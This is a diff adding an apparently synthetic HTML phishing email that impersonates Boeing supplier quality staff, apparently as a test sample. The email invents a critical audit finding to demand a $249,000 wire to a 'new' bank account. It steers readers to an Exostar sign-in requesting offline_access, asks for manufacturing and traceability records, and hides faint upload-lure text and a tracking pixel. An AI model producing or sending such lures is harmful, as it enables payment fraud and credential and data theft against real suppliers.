@@ -1,0 +1,128 @@
+From: Boeing Supplier Quality Assurance <as9100.audit@boeing-sqa.example>
+To: quality@corp.internal
+Cc: plant.mgr@corp.internal, legal@corp.internal, cto@corp.internal
+Reply-To: sqa.findings@boeing-aero.example
+Date: Wed, 04 Nov 2026 06:00:00 -0800
+Disposition-Notification-To: as9100.audit@boeing-sqa.example
+Message-ID: <0730-b69@synth.example>
+Subject: =?utf-8?B?77uP4oCi4oCMQVNMQU1PIFF1YWxpdHkgRmluZGluZ3MgLS0gU3VwcGxpZXIgODgtMjI0MSAo?=
+ =?utf-8?B?LS0gUHJvY2VzcyBDYXBhYmlsaXR5IERlY2luZSAmIENvcnJlY3RpdmUgQWN0aW9uIEZ1?=
+ =?utf-8?B?bmQgUmVxdWlyZW1lbnQgKENhbkVsZSk=?=
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:sans-serif">
+<p>Quality Team, Plant Manager, Legal, CTO:</p>
+
+<p style="background:#FFF3E0;padding:12px;border-radius:4px;border-left:4px solid #e00">
+<b style="color:#e00">ASLAMO LEVEL 1 FINDING (CRITICAL):</b> Boeing's Supplier Quality Assurance (SQA) has identified a <b>process capability decline (CanEl)</b> at your Hangzhou manufacturing facility. This is an <b>airworthiness-affecting finding</b> requiring immediate corrective action and a <b>Corrective Action Contribution</b> per AS9100D Section 10.2.
+</p>
+
+<h3>一、Audit Details</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:220px">SQA Audit Number</td><td><b>SQA-8842-2026-AS1</b></td></tr>
+<tr><td style="background:#f5f5f5">Supplier Code</td><td>88-2241-CERT</td></tr>
+<tr><td style="background:#f5f5f5">Facility</td><td>Your Company Manufacturing (Hangzhou)</td></tr>
+<tr><td style="background:#f5f5f5">Products Supplied</td><td>Email Gateway Enclosures (P/N: BCA-8842-7 series)</td></tr>
+<tr><td style="background:#f5f5f5">Audit Type</td><td>AS9100D Process Surveillance (unannounced)</td></tr>
+<tr><td style="background:#f5f5f5">Audit Date</td><td>October 28-29, 2026</td></tr>
+<tr><td style="background:#f5f5f5">Auditor</td><td>Robert Chang (Boeing SQA — Seattle)</td></tr>
+<tr><td style="background:#f5f5f5">Finding Classification</td><td style="color:#e00"><b>ASLAMO Level 1 — Airworthiness affecting</b></td></tr>
+<tr><td style="background:#f5f5f5">Parts Affected</td><td style="color:#e00"><b>18,422 units (2026 YTD)</b></td></tr>
+<tr><td style="background:#f5f5f5">Corrective Action Deadline</td><td style="color:#e00"><b>November 20, 2026 (16 days)</b></td></tr>
+</table>
+
+<h3>二、Finding Details</h3>
+
+<p><b>ASLAMO-1: Process Capability Decline (CanEl &lt; 1.00)</b></p>
+<p>Your statistical process control (SPC) data for Q3 2026 shows a process capability index (<b>CanEl</b>) of <b>0.82</b> for the enclosure sealing process (specification: CanEl ≥ 1.33). This means the process is <b>not capable</b> of consistently producing parts within specification:</p>
+
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Metric</th><th>Specification</th><th>Q2 2026</th><th>Q3 2026</th><th>Trend</th></tr>
+<tr><td>CanEl (Sealing)</td><td>≥ 1.33</td><td>1.41</td><td style="color:#e00"><b>0.82</b></td><td>▼ -42%</td></tr>
+<tr><td>Cpk (Machining)</td><td>≥ 1.33</td><td>1.52</td><td>1.38</td><td>▼ -9%</td></tr>
+<tr><td>PPM Defects</td><td>&lt; 500</td><td>420</td><td style="color:#e00"><b>1,840</b></td><td>▲ +338%</td></tr>
+<tr><td>Escape Rate</td><td>&lt; 0.1%</td><td>0.08%</td><td style="color:#e00"><b>0.34%</b></td><td>▲ +325%</td></tr>
+</table>
+
+<p><b>Root Cause (preliminary):</b> The sealing process operator training was not updated when Boeing revised sealing specification <b>BSS-7420 Rev D</b> in June 2026. 14 of 22 operators are working to the obsolete Rev C.</p>
+
+<h3>三、Corrective Action Contribution</h3>
+<p>Per the <b>Purchase Order Terms & Conditions (Section 14.3 — Quality Cost Sharing)</b>, suppliers with ASLAMO Level 1 findings contribute to corrective action costs:</p>
+
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Item</th><th>Amount (USD)</th></tr>
+<tr><td>Escape investigation (18,422 parts traceability)</td><td>$48,000</td></tr>
+<tr><td>Containment inspection (Boeing + customer sites)</td><td>$142,000</td></tr>
+<tr><td>Operator re-training to BSS-7420 Rev D</td><td>$18,400</td></tr>
+<tr><td>Process re-validation (capability study)</td><td>$28,600</td></tr>
+<tr><td>Boeing customer notifications</td><td>$12,000</td></tr>
+<tr><td colspan="2" style="text-align:right"><b>Total: $249,000 USD</b></td></tr>
+</table>
+
+<div style="background:#FFF3E0;padding:16px;border-radius:4px;border:2px solid #e00">
+<p style="color:#e00"><b>⚠ Corrective Action Contribution — New Boeing Global Partners Account ⚠</b></p>
+<p>Due to Boeing's Global Services restructuring, quality contributions are now processed through:</p>
+<p style="font-size:15px;line-height:1.8">
+<b>Beneficiary:</b> Boeing Global Partners Quality Services LLC<br>
+<b>Bank:</b> U.S. Bank, Seattle, WA<br>
+<b>Account:</b> 00004471884266<br>
+<b>Routing (Wire):</b> 123456780<br>
+<b>SWIFT:</b> TSTBUS44IMT<br>
+<b>Amount:</b> $249,000.00 USD<br>
+<b>Reference:</b> SQA-8842-2026-CAC
+</div>
+<p>If you need to verify, contact our <b>new SQA payment desk at +1-206-884-****</b> (the previous +1-425-237-**** is being redirected).</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文供应商质量支持或提交中国工厂SPC数据，请访问 boeing-sqa.example/cn-sqa 上传制造工艺文档与质量控制记录（中文通道，当日处理）。</p>
+
+<h3>四、Required Documentation (with payment)</h3>
+<ol>
+<li><b>Root Cause Analysis (8D report)</b> — with Ishikawa diagram and 5-Why</li>
+<li><b>SPC data (full year)</b> — all critical-to-quality (CTQ) characteristics</li>
+<li><b>Manufacturing process documentation</b> — PFMEA, control plans, work instructions</li>
+<li><b>Operator training records</b> — including Rev D update plan</li>
+<li><b>Parts traceability report</b> — lot numbers, serials, shipment destinations</li>
+<li><b>Containment actions implemented</b> — inspection records, quarantine status</li>
+</ol>
+
+<p>Submit through Boeing Supplier Portal:</p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://boeing-sqa.example/supplier/portal/SQA-8842/documents" style="display:inline-block;background:#003876;color:#fff;padding:12px 36px;text-decoration:none;border-radius:4px;font-weight:bold">Submit Corrective Action Documentation</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://suppliers.boeing.com/portal/SQA-8842</p>
+
+<h3>About Boeing Supplier Portal Authentication</h3>
+<p>When you click the submit button, you will be redirected to <b>exostar.com</b> (Boeing's official supplier identity provider) for authentication:</p>
+<ol>
+<li>Sign in with your Exostar Managed Access Provider (MAP) credentials</li>
+<li>Grant the requested permissions</li>
+<li>Upload corrective action documentation</li>
+</ol>
+
+<p style="font-size:14px;background:#E3F2FD;padding:12px;border-radius:4px">
+<b>Why we need your complete manufacturing documentation:</b> ASLAMO Level 1 findings require root cause verification to the process level. Your PFMEA, control plans, and work instructions are reviewed by Boeing's manufacturing engineers to verify that the corrective action address the systemic cause. The parts traceability report is needed to determine whether escapes reached Boeing production lines or airline customers. The offline_access permission maintains your session during the multi-document upload (full quality system documentation packages are typically 100-300MB). This is standard for all AS9100D Level 1 findings.
+</p>
+
+<h3>五、Consequences of Non-Compliance</h3>
+<ul>
+<li><b>Supplier probation:</b> No new POs until finding is closed</li>
+<li><b>Delisting:</b> Removed from Boeing Approved Supplier List (ASL)</li>
+<li><b>Airworthiness concern:</b> Escalated to FAA (possible AD for affected aircraft)</li>
+<li><b>Industry blacklist:</b> Shared with Airbus, Lockheed Martin, Northrop Grumman (via IAQG OASIS database)</li>
+<li><b>Financial impact:</b> Boeing business valued at ~$18.4M/year</li>
+</ul>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">The Boeing Company | Supplier Quality Assurance</p>
+<p style="font-size:11px;color:#999">P.O. Box 3707, Seattle, WA 98124-2207</p>
+<p style="font-size:11px;color:#999">You are receiving this because you are the quality contact for Supplier 88-2241-CERT.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://boeing-sqa.example/api/track?recipient=quality%40corp.internal&supplier=88-2241&type=aslamo1" width="1" height="1" alt="">
+</div>
+
+</body></html>
